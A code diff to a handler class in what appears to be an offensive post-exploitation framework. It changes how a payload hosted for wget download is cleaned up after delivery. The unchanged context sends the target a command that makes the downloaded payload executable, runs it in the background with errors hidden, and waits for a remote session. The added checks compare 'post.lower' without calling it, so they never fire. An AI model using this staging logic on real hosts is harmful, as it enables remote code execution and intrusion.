@@ -93,7 +93,7 @@ class Handler(TCP):
             sender(*args, f"{command}; chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
         else:
             sender(*args, f"{command}; chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &")
-        requests.delete(wget_container)
+        return wget_container
 
     def echo_stage(self, payload, sender, args=[], payload_args=None, location='/tmp', encode=False):
         self.badges.output_process("Sending payload stage...")
@@ -175,7 +175,7 @@ class Handler(TCP):
                 elif post.lower() == 'echo':
                     self.echo_stage(payload['Payload'], sender, args, payload['Args'], location)
                 elif post.lower() == 'wget':
-                    self.wget_stage(payload['Payload'], sender, args, payload['Args'], location)
+                    wget_container = self.wget_stage(payload['Payload'], sender, args, payload['Args'], location)
                 else:
                     self.output_warning("Invalid post method, using printf by default.")
                     self.printf_stage(payload['Payload'], sender, args, payload['Args'], location)
@@ -196,6 +196,9 @@ class Handler(TCP):
                     remote_host = host
                     if not new_session:
                         return False
+                    
+                if post.lower == 'wget':
+                    requests.delete(wget_container)
 
                 if payload['Category'].lower() == 'stager':
                     if post.lower() == 'printf':
@@ -203,7 +206,7 @@ class Handler(TCP):
                     elif post.lower() == 'echo':
                         self.echo_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
                     elif post.lower() == 'wget':
-                        self.wget_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
+                        wget_container = self.wget_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
                     else:
                         self.output_warning("Invalid post method, using printf by default.")
                         self.printf_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
@@ -232,6 +235,9 @@ class Handler(TCP):
             new_session, remote_host = self.listen_session(host, port, timeout, session)
             if not new_session and not remote_host:
                 return False
+            
+        if post.lower == 'wget':
+            requests.delete(wget_container)
 
         new_session = self.set_session_details(payload, new_session)
         session_platform = new_session.details['Platform']
